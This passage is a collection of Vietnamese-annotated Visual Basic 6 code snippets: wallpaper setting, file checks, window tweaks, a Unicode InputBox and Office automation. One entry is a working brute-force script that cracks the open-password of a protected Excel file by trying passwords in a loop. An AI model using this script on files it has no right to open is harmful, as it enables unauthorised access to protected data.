    hRes = IIDFromString(StrPtr(IID_ActiveDesktop), iid)
    If hRes &lt;&gt; 0 Then
        Exit Function
    End If
 
    hRes = CoCreateInstance(classid, 0, CLSCTX_INPROC_SERVER, iid, VarPtr(obj))
    If hRes &lt;&gt; 0 Then
        Exit Function
    End If
 
    RtlMoveMemory vtblptr, ByVal obj, 4
    RtlMoveMemory vtbl, ByVal vtblptr, Len(vtbl)
 
    hRes = CallPointer(vtbl.SetWallpaper, obj, StrPtr(strFile), 0)
    If hRes = 0 Then
        SetWallpaper = True
    End If
    hRes = CallPointer(vtbl.ApplyChanges, obj, AD_APPLY_ALL Or AD_APPLY_FORCE)
    CallPointer vtbl.Release, obj
End Function
 
Private Function CallPointer(ByVal fnc As Long, ParamArray params()) As Long
 
  Dim btASM(&amp;HEC00&amp; - 1)  As Byte
  Dim pASM                As Long
  Dim i                   As Integer
 
  pASM = VarPtr(btASM(0))
 
  AddByte pASM, &amp;H58
  AddByte pASM, &amp;H59
  AddByte pASM, &amp;H59
  AddByte pASM, &amp;H59
  AddByte pASM, &amp;H59
  AddByte pASM, &amp;H50
 
  For i = UBound(params) To 0 Step -1
    AddPush pASM, CLng(params(i))
  Next
 
  AddCall pASM, fnc
  AddByte pASM, &amp;HC3
 
  CallPointer = CallWindowProcA(VarPtr(btASM(0)), 0, 0, 0, 0)
End Function
 
Private Sub AddPush(pASM As Long, lng As Long)
  AddByte pASM, &amp;H68
  AddLong pASM, lng
End Sub
 
Private Sub AddCall(pASM As Long, addr As Long)
  AddByte pASM, &amp;HE8
  AddLong pASM, addr - pASM - 4
End Sub
 
Private Sub AddLong(pASM As Long, lng As Long)
  RtlMoveMemory ByVal pASM, lng, 4
  pASM = pASM + 4
End Sub
 
Private Sub AddByte(pASM As Long, bt As Byte)
  RtlMoveMemory ByVal pASM, bt, 1
  pASM = pASM + 1
End Sub

Cách dùng:

SetWallpaper "C:\WINDOWS\Web\Wallpaper\Ascent.jpg"

nếu giá trị hàm trả về True tức là thành công, còn nếu là False thì... </NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>085627085610</MaVD>
    <NoiDung>Private Sub Form_Load()
TargetFolder = "D:\Test": SourceFolder = "D:\Kho\Media" '&lt;--- Edit the Paths
If Dir(TargetFolder, vbDirectory) = "" Then MkDir TargetFolder
Set objshell = CreateObject("Shell.Application").NameSpace(TargetFolder)
objshell.CopyHere SourceFolder '&lt;--- Folder Nguôn
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>085827085812</MaVD>
    <NoiDung>gửi bởi anhtuyenbk

Public Function CheckFolderFileType(PathFile As String) As String
    'Khong ton tai
    If Dir(PathFile) = "" And Dir(PathFile, vbDirectory) = "" Then
        CheckFolderFileType = "Not Exist"
    Else
        'Day la File
        If Dir(PathFile) &lt;&gt; "" Then
            CheckFolderFileType = "IsFile"
        Else  'Day la Folder
            CheckFolderFileType = "IsFolder"
        End If
    End If
End Function


gửi bởi truongphu

Private Function ReportFF(Path$) As String
  Dim fso As Object:   Set fso = CreateObject("Scripting.FileSystemObject")
  If (fso.FileExists(Path)) Then
    ReportFF = "FileExists"
  ElseIf (fso.FolderExists(Path)) Then
    ReportFF = "FolderExists"
  Else
    ReportFF = "FolderNOTExists"
  End If
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080027090030</MaVD>
    <NoiDung>Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Const SW_SHOWNORMAL = 1
 
Dim txtRun As String
 
Private Sub btnBrowse_Click()
Set objdialog = CreateObject("UserAccounts.CommonDialog")
objdialog.Filter = "Programs|*.exe"
objdialog.InitialDir = "C:\"
Browse = objdialog.ShowOpen
If Browse = 0 Then
Else
    cboRun.Text = objdialog.FileName
End If
End Sub
 
Private Sub btnOK_Click()
On Error Resume Next
txtRun = Trim(cboRun.Text)
 
If txtRun = "" Then
 
ElseIf Right(txtRun, 3) = "cpl" Then
ShellExecute Me.hWnd, vbNullString, txtRun, vbNullString, "C:\", SW_SHOWNORMAL
 
ElseIf Right(txtRun, 3) = "msc" Then
ShellExecute Me.hWnd, vbNullString, txtRun, vbNullString, "C:\", SW_SHOWNORMAL
 
ElseIf Left(txtRun, 8) = "control " Then
Control = Shell("control " &amp; Mid(txtRun, 9), vbMaximizedFocus)
 
Else
ShellExecute Me.hWnd, vbNullString, txtRun, vbNullString, "C:\", SW_SHOWNORMAL
 
End If
End Sub
 
Private Sub cboRun_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then btnOK_Click
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080127090138</MaVD>
    <NoiDung>Option Explicit
Private Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" _
(ByVal hwnd As Long, ByVal nIndex As Long) As Long
Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" _
(ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
 
Private Const GWL_STYLE = (-16)
Private Const WS_MINIMIZEBOX = &amp;H20000
Private Const WS_MAXIMIZEBOX = &amp;H10000
 
Private Function AddMinimizeButton(po_Form As Form)
    Dim ll_Style As Long
    'Get window style...
    ll_Style = GetWindowLong(po_Form.hwnd, GWL_STYLE)
    'Add the minimize button...
    Call SetWindowLong(po_Form.hwnd, GWL_STYLE, ll_Style Or WS_MINIMIZEBOX)
End Function
 
Private Sub Form_Load()
    AddMinimizeButton Me
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080427090425</MaVD>
    <NoiDung>Một số bạn thường tự tạo skin form bằng cách đặt borderstyle = 0 rồi chèn một hình ảnh nào đó vào, nhưng làm như vậy sẽ có hạn chế là khi thay đổi kích thước, hình chèn trước đó sẽ ko khớp, vì vậy mình nghĩ ra cách tạo viền bằng các line gradien.

Sub CreatFormBoder(fr As Form, ByVal vWidth As Byte, ByVal TileBarWidth As Byte)
Dim LastValue As Boolean
fr.ScaleMode = 3
LastValue = fr.AutoRedraw
fr.AutoRedraw = True
 
For i = vWidth To 0 Step -1
    'Left
        fr.Line (i, 0)-(i, fr.ScaleHeight), RGB(i * 50, i * 10 + 220, i * 50)
    'Right
        fr.Line (fr.ScaleWidth - i, 0)-(fr.ScaleWidth - i, fr.ScaleHeight), RGB(i * 50, i * 10 + 220, i * 50)
    'Down
        fr.Line (0, fr.ScaleHeight - i)-(fr.ScaleWidth, fr.ScaleHeight - i), RGB(i * 50, i * 10 + 220, i * 50)
Next i
'Ve TileBar
For i = TileBarWidth To 1 Step -1
        fr.Line (0, i)-(fr.ScaleWidth, i), RGB(i * 10, i * 10 + 200, i * 10)
Next i
fr.Picture = fr.Image
fr.AutoRedraw = LastValue
End Sub
Private Sub Form_Resize()
CreatFormBoder Form1, 3, 10
End Sub

Mình chỉ mới tạo một kiểu màu xanh này thôi, các bạn tự nghiên cứu phần màu của line thì sẽ tạo ra nhiều kiểu màu gadien hơn..
(vì là border nên tham số vWidth bạn nên cho &lt;= 5)</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080727090720</MaVD>
    <NoiDung>'InputBox ho tro xuat nhap du lieu Unicode co ho tro password
'Tac gia: Tran Dai Nghia (Giang Ho)
'Email: gianghopphoenix@yahoo.com
'Website: http://www.giangho.biz; http://www.caulacbovb.com
'Ngay viet: 19/05/2008
'---------------------------------------------------------
 
Private Const GWL_WNDPROC = (-4&amp;)
Private Const WH_CBT As Long = &amp;H5
Private Const HCBT_ACTIVATE As Long = &amp;H5
Public Const WM_SETTEXT = &amp;HC
Public Const WM_SETFONT = &amp;H30
Public Const NV_INPUTBOX As Long = &amp;H5000&amp;
Private Const EM_SETPASSWORDCHAR = &amp;HCC
 
Private Declare Function CreateFont Lib "gdi32" Alias "CreateFontA" (ByVal H As Long, ByVal w As Long, ByVal E As Long, ByVal O As Long, ByVal w As Long, ByVal i As Long, ByVal U As Long, ByVal s As Long, ByVal C As Long, ByVal OP As Long, ByVal CP As Long, ByVal Q As Long, ByVal PAF As Long, ByVal f As String) As Long
Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd&amp;, ByVal nIndex&amp;, ByVal dwNewLong&amp;) As Long
Private Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Long, ByVal lpfn As Long, ByVal hMod As Long, ByVal dwThreadId As Long) As Long
Private Declare Function CallNextHookEx Lib "user32" (ByVal hHook As Long, ByVal CodeNo As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function UnhookWindowsHookEx Lib "user32" (ByVal hHook As Long) As Long
Private Declare Function GetCurrentThreadId Lib "kernel32" () As Long
Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal ParenthWnd As Long, ByVal ChildhWnd As Long, ByVal ClassName As String, ByVal Caption As String) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function MessageBoxW Lib "user32.dll" (ByVal hwnd As Long, ByVal lpText As Long, ByVal lpCaption As Long, ByVal uType As Long) As Long
Private Declare Function SetWindowTextW Lib "user32" (ByVal hwnd As Long, ByVal lpString As Long) As Long
Private Declare Function DefWindowProcW Lib "user32" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function GetWindowTextW Lib "user32.dll" (ByVal hwnd As Long, ByVal lpString As Long, ByVal cch As Long) As Long
Public Declare Function GetWindowTextLengthW Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function SetTimer&amp; Lib "user32" (ByVal hwnd&amp;, ByVal nIDEvent&amp;, ByVal uElapse&amp;, ByVal lpTimerFunc&amp;)
Private Declare Function KillTimer&amp; Lib "user32" (ByVal hwnd&amp;, ByVal nIDEvent&amp;)
Public Declare Sub InitCommonControls Lib "comctl32.dll" ()
 
Private pHook2 As Long, pHook3 As Long, hEdit As Long, hIdEvent As Long, UsePass As Boolean
Private sStatic As String, sDefault As String, sTitle As String, sInput As String, txt As String
 
Private Function InputHookProc(ByVal ncode As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Dim hStatic1 As Long, hStatic2 As Long, hButton As Long, hFont As Long
InputHookProc = CallNextHookEx(pHook2, ncode, wParam, lParam)
If ncode = HCBT_ACTIVATE Then
   hFont = CreateFont(13, 0, 0, 0, 500, 0, 0, 0, 0, 0, 0, 0, 0, "Tahoma")
   
   hStatic1 = FindWindowEx(wParam, 0&amp;, "Static", vbNullString)
   hStatic2 = FindWindowEx(wParam, hStatic1, "Static", vbNullString)
   If hStatic2 = 0 Then hStatic2 = hStatic1
   SendMessage hStatic2, WM_SETFONT, hFont, ByVal 1&amp;
   DefWindowProcW hStatic2, WM_SETTEXT, &amp;H0&amp;, StrPtr(sStatic)
   DefWindowProcW wParam, WM_SETTEXT, &amp;H0&amp;, StrPtr(sTitle)
   
   hButton = FindWindowEx(wParam, 0&amp;, "Button", "OK")
   SendMessage hButton, WM_SETFONT, hFont, ByVal 1&amp;
   DefWindowProcW hButton, WM_SETTEXT, &amp;H0&amp;, StrPtr("Xác nh" &amp; ChrW(7853) &amp; "n")
   
   hButton = FindWindowEx(wParam, 0&amp;, "Button", "Cancel")
   SendMessage hButton, WM_SETFONT, hFont, ByVal 1&amp;
   DefWindowProcW hButton, WM_SETTEXT, &amp;H0&amp;, StrPtr("H" &amp; ChrW(7911) &amp; "y b" &amp; ChrW(7887))
 
    hEdit = FindWindowEx(wParam, 0&amp;, "Edit", "")
    SendMessage hEdit, WM_SETFONT, hFont, ByVal 1&amp;
    
    If sDefault &lt;&gt; "" Then
    SetWindowTextW hEdit, StrPtr(sDefault) 'Khong ho tro Tieng Viet o Input Textbox khi Style = Windows Classic
    SendKeys "+{END}" 'Select text
    End If
     
    If UsePass Then SendMessage hEdit, EM_SETPASSWORDCHAR, Asc("*"), 0
    
    UnhookWindowsHookEx pHook3
End If
End Function
 
Public Function UniInputBox(ByVal Prompt As String, Optional ByVal Title As String = "", Optional ByVal Default As String = "", Optional ByVal Password As Boolean = False) As String
    pHook3 = SetWindowsHookEx(WH_CBT, AddressOf InputHookProc, App.hInstance, GetCurrentThreadId())
    UsePass = Password
    sStatic = VnToUni(Prompt)
    sDefault = VnToUni(Default)
    sTitle = VnToUni(Title)
    SetTimer 0, NV_INPUTBOX, 50, AddressOf TimerProc 'Lay du lieu Tieng Viet o Input Text Box
    txt = InputBox(sStatic, sTitle, sDefault)
    KillTimer 0, hIdEvent
    If txt &lt;&gt; "" Then UniInputBox = StripNulls(sInput)
End Function
 
Public Sub TimerProc(ByVal hwnd&amp;, ByVal uMsg&amp;, ByVal idEvent&amp;, ByVal dwTime&amp;)
If hEdit &lt;&gt; 0 Then sInput = GetUniText(hEdit) 'Copy lien tuc ^^!
hIdEvent = idEvent
End Sub
 
Private Function GetUniText(ByVal hwnd As Long) As String
Dim lLen As Long, sBuf As String
lLen = 1 + GetWindowTextLengthW(hwnd)
If (lLen &gt; 1) Then
    sBuf = String$(lLen, 0)
    GetWindowTextW hwnd, StrPtr(sBuf), lLen
    GetUniText = (sBuf)
Else
    GetUniText = vbNullString
End If
End Function
 
Private Function StripNulls(ByVal sString As String) As String
Dim lPos As Long
    lPos = InStr(sString, vbNullChar)
    If (lPos = 1) Then
        StripNulls = vbNullString
    ElseIf (lPos &gt; 1) Then
        StripNulls = Left$(sString, lPos - 1)
        Exit Function
    End If
    StripNulls = sString
End Function
 
'Code convert TCVN3 -&gt; Unicode by TruongPhu
Public Function VnToUni(str As String) As String
Dim i&amp;, arrUNI() As String, sUni$, ABC$, UNI$
ABC = "¸µ¶·¹¨¾»¼½Æ©ÊÇÈÉËÐÌÎÏÑªÕÒÓÔÖÝ×ØÜÞãßáâä«èåæçé¬íêëìîóïñòô­øõö÷ùýúûüþ®¸µ¶·¹¡¾»¼½Æ¢ÊÇÈÉËÐÌÎÏÑ£ÕÒÓÔÖÝ×ØÜÞãßáâä¤èåæçé¥íêëìîóïñòô¦øõö÷ùýúûüþ§"
UNI = "225,224,7843,227,7841,259,7855,7857,7859,7861,7863,226,7845,7847,7849,7851,7853,233,232,7867,7869,7865,234,7871,7873,7875,7877,7879,237,236,7881,297,7883,243,242,7887,245,7885,244,7889,7891,7893,7895,7897,417,7899,7901,7903,7905,7907,250,249,7911,361,7909,432,7913,7915,7917,7919,7921,253,7923,7927,7929,7925,273,225,224,7843,227,7841,258,7855,7857,7859,7861,7863,194,7845,7847,7849,7851,7853,233,232,7867,7869,7865,202,7871,7873,7875,7877,7879,237,236,7881,297,7883,243,242,7887,245,7885,212,7889,7891,7893,7895,7897,416,7899,7901,7903,7905,7907,250,249,7911,361,7909,431,7913,7915,7917,7919,7921,253,7923,7927,7929,7925,272"
arrUNI = Split(UNI, ",")
For i = 1 To Len(str$)
If InStr(ABC, Mid(str$, i, 1)) &gt; 0 Then
 sUni = sUni &amp; ChrW(arrUNI(InStr(ABC, Mid(str$, i, 1)) - 1))
 Else
 sUni = sUni &amp; Mid(str$, i, 1)
 End If
Next
VnToUni = sUni
End Function


Đoạn này cho vào Form

Dim ret As String
 
Private Sub Form_Initialize()
InitCommonControls
End Sub
 
 
Private Sub Command1_Click()
ret = UniInputBox("InputBox hç trî nhËp xuÊt TiÕng ViÖt Unicode" &amp; vbCrLf &amp; _
"T¸c gi¶: TrÇn §¹i NghÜa (Giang Hå)" &amp; vbCrLf &amp; "Hç trî nhËp Password" &amp; vbCrLf &amp; _
"Textbox kh«ng hç trî Unicode ë Windows Classic Style", "Input Box Unicode", "NÕu thÊy hay th× nhÊn Thanks c¸i nha !")
If ret &lt;&gt; "" Then MessageBoxW hwnd, StrPtr(ret), StrPtr("www.caulacbovb.com"), 0
End Sub
 
Private Sub Command2_Click()
ret = UniInputBox("NhËp Password v« ®©y !", "Enter Password", , True)
If ret &lt;&gt; "" Then MessageBoxW hwnd, StrPtr(ret), StrPtr("www.caulacbovb.com"), 0
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080827090848</MaVD>
    <NoiDung>Private Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Long, ByVal dwExtraInfo As Long)
Const KEYEVENTF_KEYUP = &amp;H2
Const VK_LWIN = &amp;H5B
 
Private Sub Form_Load()
minAll
End Sub
 
Function minAll()
Call keybd_event(VK_LWIN, 0, 0, 0)
Call keybd_event(77, 0, 0, 0)
Call keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0)
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>081127091114</MaVD>
    <NoiDung>Private Declare Function GetTickCount Lib "Kernel32.dll" () As Long
Private Sub Form_Load()
MsgBox Fix((GetTickCount / 60000) / 60) &amp; " Gio " &amp; (Round(GetTickCount / 60000) Mod 60) &amp; " Phut"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>081227091235</MaVD>
    <NoiDung>Private Sub ExceltoAccess2(ExcelPath$, AccessPath$)
Const acImport = 0: Const acSpreadsheetTypeExcel9 = 8
Set objAccess = CreateObject("Access.Application")
objAccess.NewCurrentDatabase AccessPath$
objAccess.DoCmd.TransferSpreadsheet acImport, acSpreadsheetTypeExcel9, "Test", ExcelPath$, True
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>081327091331</MaVD>
    <NoiDung>Cần có:
- 1 Timer.
- 1 CommandButton.
- 2 Shape: Shape1 và Shape2.

Dim direct1, direct2, left1, top1, step1h, step1v
Dim direct3, direct4, left2, top2, step2h, step2v
 
Private Sub Command1_Click()
    If Command1.Caption = "Move" Then
        Command1.Caption = "Stop"
    Else
        Command1.Caption = "Move"
    End If
End Sub
 
Private Sub Form_Load()
    Shape1.Shape = 3
    Shape2.Shape = 3
    Command1.Caption = "Move"
    Timer1.Interval = 1
    Randomize
    direct1 = -1
    direct2 = 1
    left1 = Shape1.Left
    top1 = Shape1.Top
    step1h = Int(10 * Rnd) + 25
    step1v = Int(10 * Rnd) + 25
    direct3 = 1
    direct4 = -1
    left2 = Shape2.Left
    top2 = Shape2.Top
    step2h = Int(20 * Rnd) + 25
    step2v = Int(20 * Rnd) + 25
End Sub
 
Private Sub Timer1_Timer()
If Command1.Caption = "Stop" Then
    If (Shape1.Top &lt; 0) Or (Shape1.Top &gt; Form1.ScaleHeight - Shape1.Height) Then direct2 = -direct2
    If (Shape1.Left &lt; 0) Or (Shape1.Left &gt; Form1.ScaleWidth - Shape1.Width) Then direct1 = -direct1
    left1 = left1 + step1h * direct1
    top1 = top1 + step1v * direct2
    Shape1.Move left1, top1
    If (Shape2.Top &lt; 0) Or (Shape2.Top &gt; Form1.ScaleHeight - Shape2.Height) Then direct4 = -direct4
    If (Shape2.Left &lt; 0) Or (Shape2.Left &gt; Form1.ScaleWidth - Shape2.Width) Then direct3 = -direct3
    left2 = left2 + step2h * direct3
    top2 = top2 + step2v * direct4
    Shape2.Move left2, top2
End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>081527091516</MaVD>
    <NoiDung>'@@@ Script runs a Brute Force attack
'@@@ on an Excel File that is password protected for open
'@@@ Created by Jim Jackson MCP
'@@@ Created on 4/20/2005
 
Dim strCPWD, curPW, Found
Sub Error_Handle()
DoEvents
If Err.Number = 1004 Then
strCPWD = NextPW(strCPWD, False, 0)
Err.Clear
ElseIf Err.Number &lt;&gt; 0 Then
MsgBox "Other Error: " &amp; vbCrLf &amp; "Number: " &amp; Err.Number &amp; vbCrLf &amp; "Description: " &amp; _
Err.Description &amp; vbCrLf &amp; "Password: " &amp; strCPWD
End
Else
Text1 = "Password Found: " &amp; strCPWD
Found = 1
End If
End Sub
 
Function NextPW(startPW, noChange, startLength)
DoEvents
Dim pw, i, s
If startPW &lt;&gt; "" And curPW = "" Then
curPW = startPW
NextPW = curPW
Exit Function
End If
If curPW = "" Then
curPW = String(startLength, 97)
NextPW = curPW
Exit Function
End If
If curPW = String(Len(curPW), 90) Then
NextPW = String(Len(curPW) + 1, 97)
If noChange = False Then curPW = NextPW
Exit Function
End If
ReDim pw(Len(curPW))
For i = 1 To Len(curPW)
pw(i) = Mid(curPW, i, 1)
Next
i = UBound(pw)
x = 1
Do While x = 1 'donextchar:
x = 0
s = Asc(pw(i)) + 1
Select Case s
Case 58
pw(i) = Chr(65)
Case 123
pw(i) = Chr(48)
Case 91
pw(i) = Chr(97)
i = i - 1
x = 1 'GoTo donextchar
Case Else
pw(i) = Chr(s)
End Select
Loop
For s = LBound(pw) To UBound(pw)
NextPW = NextPW &amp; pw(s)
Next
If noChange = False Then curPW = NextPW
End Function
 
Private Sub Command1_Click()
Command2.Caption = "Ngu`ng"
a = Now
DoEvents
Found = 0
strFilePath = "c:\Run.xls"
strCPWD = "0"
Set objExcel = CreateObject("Excel.Application")
Do While Found = 0
On Error Resume Next
objExcel.Workbooks.Open strFilePath, , , , strCPWD
Text1 = strCPWD
Error_Handle
Text2 = Format((Now - a), "hh:mm:ss")
Loop
End Sub
 
Private Sub Command2_Click()
End
End Sub

Pass-Excel.rar </NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>081627091656</MaVD>
    <NoiDung>Private Sub CreateSC2QL(OBJPath$, ShortcutName$)
Set objShell = CreateObject("WScript.Shell")
strFolder = objShell.Environment("Volatile").Item("APPDATA") &amp; "\Microsoft\Internet Explorer\Quick Launch"
Set objShortCut = objShell.CreateShortcut(strFolder &amp; "\" &amp; ShortcutName &amp; ".lnk")
objShortCut.TargetPath = OBJPath$
objShortCut.Save
End Sub
 

ứng dụng: Tạo 3 Shortcuts vào Quick launch là: Calc.exe, Ổ đĩa C: và file Doc

Private Sub Form_Load()
Call CreateSC2QL("Calc.exe", "CAL")
Call CreateSC2QL("C:\", "Ðia C")
Call CreateSC2QL("C:\Mùa Thu Lá Bay.DOC", "MTLB")
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>081827091811</MaVD>
    <NoiDung>Private Function ListAllTable(AccessFile$) As String
Const adSchemaTables = 20  'hang sô so' Ðô Table
arrCriteria = Array(Empty, Empty, Empty, "Table")  'Loai bo Temp Table
 
Set objConnection = CreateObject("ADODB.Connection")
Set objRecordset = CreateObject("ADODB.Recordset")
 
objConnection.Open "Provider = Microsoft.Jet.OLEDB.4.0; " &amp; "Data Source =" &amp; AccessFile
Set objRecordset = objConnection.OpenSchema(adSchemaTables, arrCriteria)
 
Do Until objRecordset.EOF
    ListAllTable = ListAllTable &amp; vbCr &amp; "Table name: " &amp; objRecordset.Fields.Item("TABLE_NAME")
    ListAllTable = ListAllTable &amp; vbCr &amp; "Table type: " &amp; objRecordset.Fields.Item("TABLE_TYPE")
        objRecordset.MoveNext
Loop
objConnection.Close
End Function
 
Private Sub Form_Load()
MsgBox ListAllTable("E:\Kho\Test.mdb")
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>081927091916</MaVD>
    <NoiDung>'Thêm vào Form 1 Timer(Interval =100), 1 Picture Box
'Tác giả: tindl88
 
Option Explicit
 
Private Type POINTAPI
        x As Long
        y As Long
End Type
 
Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Private Declare Function GetPixel Lib "gdi32" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long) As Long
Private Declare Function GetWindowDC Lib "user32" (ByVal hwnd As Long) As Long
 
Private Sub Timer1_Timer()
    Dim Area As POINTAPI
    Dim lColor As String
    Dim winHwnd As Long
    
    winHwnd = GetWindowDC(0)
    Call GetCursorPos(Area)
    lColor = GetPixel(winHwnd, Area.x, Area.y)
    Picture1.BackColor = lColor
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>082027092037</MaVD>
    <NoiDung>Private Sub Form_Load()
Const wdReplaceAll = 2
Set objWord = CreateObject("Word.Application")
objWord.Visible = True
Set objDoc = objWord.Documents.Open("C:\Mùa Thu Lá Bay.doc")
Set objSelection = objWord.Selection
 
objSelection.Find.Text = "anh" '&lt;-- tu` tìm
objSelection.Find.Forward = True
objSelection.Find.MatchWholeWord = True
 
objSelection.Find.Replacement.Text = "Em" '&lt;-- tu` thay
objSelection.Find.Execute , , , , , , , , , , wdReplaceAll
objWord.quit
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>082127092120</MaVD>
    <NoiDung>Private Sub Form_Load()
  Set objShell = CreateObject("Shell.Application")
    objShell.TileHorizontally
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>082227092214</MaVD>
    <NoiDung>Private Function NumWord(TextFile$) As String
' Tao thu viên và Ðoc file Unicode. truongphu
Set objDic = CreateObject("Scripting.Dictionary")
Set objFSO = CreateObject("Scripting.FileSystemObject").OpenTextFile(TextFile$, 1, , -2)
    strText = objFSO.ReadAll
objFSO.Close
        strText = Replace(strText, ":", " ") 'Loai bo các dâu không cân thiêt
        strText = Replace(strText, ",", " ")
        strText = Replace(strText, ".", " ")
        strText = Replace(strText, "!", " ")
        strText = Replace(strText, "?", " ")
        strText = Replace(strText, vbCrLf, " ")
    arrWords = Split(strText, " ")
    
For Each strWord In arrWords
    If Len(strWord) Then
        If objDic.Exists(strWord) Then
            objDic.Item(strWord) = objDic.Item(strWord) + 1 'Ðêm các tu`
        Else
            objDic.Add strWord, 1
     End If: End If
Next
 
    colKeys = objDic.Keys
For Each strKey In colKeys
    NumWord = NumWord &amp; strKey &amp; " -- " &amp; objDic.Item(strKey) &amp; vbCr
Next
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>082327092313</MaVD>
    <NoiDung>Offset: vị trí bắt đầu lấy text
Length: độ dài của text cần lấy bắt đầu từ vị trí Offset

Public Function StrInFile(ByRef Path As String, ByVal Offset As Long, _
    ByVal Length As Long) As String
    
    If Length &lt; 1 Then Exit Function
    
    Dim intFF As Integer, bytData() As Byte
    Dim lonLen As Long
    intFF = FreeFile
    
    Open Path For Binary Access Read As #intFF
        If Offset &lt;= LOF(intFF) Then
            If LOF(intFF) - Offset &gt;= Length Then
                ReDim bytData(0 To Length) As Byte
                Get #intFF, Offset, bytData
            Else
                lonLen = LOF(intFF) - Offset
                ReDim bytData(0 To lonLen) As Byte
                Get #intFF, Offset, bytData
            End If
        End If
    Close #intFF
    
    StrInFile = StrConv(bytData, vbUnicode)
    Erase bytData
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>082427092433</MaVD>
    <NoiDung>Bạn có thể chỉnh sửa lại các chữ trong dấu kép "" để phù hợp với ứng dụng.
Nguyên tắc: tên ứng dụng càng dài càng chính xác
Code sau đây chỉ có một hoặc vài ký tự đại diện cho ứng dụng, tôi muốn chứng tỏ tính linh động của Object
Mới test trên XP2


Private Sub Form_Load()
Set colTasks = CreateObject("Word.Application").Tasks
If colTasks.Exists("pa") Then colTasks("pa").Close 'paint
If colTasks.Exists("ows") Then colTasks("ows").Close 'C:\windows
If colTasks.Exists("ca") Then colTasks("ca").Close 'calc
If colTasks.Exists("u") Then colTasks("u").Close 'notepad
If colTasks.Exists("do") Then colTasks("do").Close 'word hay wordpad
If colTasks.Exists("book1") Then colTasks("book1").Close 'excel
Set colTasks = Nothing
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>082527092522</MaVD>
    <NoiDung>Private Declare Function AppendMenu Lib "user32" Alias "AppendMenuA" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As Any) As Long
Private Declare Function CreatePopupMenu Lib "user32" () As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Const MF_ENABLED = &amp;H0&amp;: Const MF_POPUP = &amp;H10&amp;: Const MF_STRING = &amp;H0&amp;: Const WM_NCPAINT = &amp;H85
 
Private Sub Form_Load()
Shell "Notepad"
Dim newMenu&amp;, notepad&amp;, notepadMenu&amp;
newMenu = CreatePopupMenu
Call AppendMenu(newMenu, MF_ENABLED Or MF_STRING, 0, "Item One")
Call AppendMenu(newMenu, MF_ENABLED Or MF_STRING, 1, "Item Two")
Call AppendMenu(newMenu, MF_ENABLED Or MF_STRING, 2, "Item Three")
notepad = FindWindow("notepad", vbNullString)
notepadMenu = GetMenu(notepad)
Call AppendMenu(notepadMenu, MF_POPUP, newMenu, "Item List")
Call SendMessage(notepad, WM_NCPAINT, 0&amp;, 0&amp;)
Me.Show: Me.FontSize = 12: Me.FontBold = True
Print "Notepad menu has Item List"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000115</MaVD>
    <NoiDung>Private Declare Function Beep Lib "kernel32" (ByVal dwFreq As Long, ByVal dwDuration As Long) As Long
Private Sub Form_Activate()
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim Cnt As Long
    For Cnt = 0 To 5000 Step 10
        'play a tone of 'Cnt' hertz, for 50 milliseconds
        Beep Cnt, 50
        Me.Caption = Cnt
        DoEvents
    Next Cnt
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000056</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
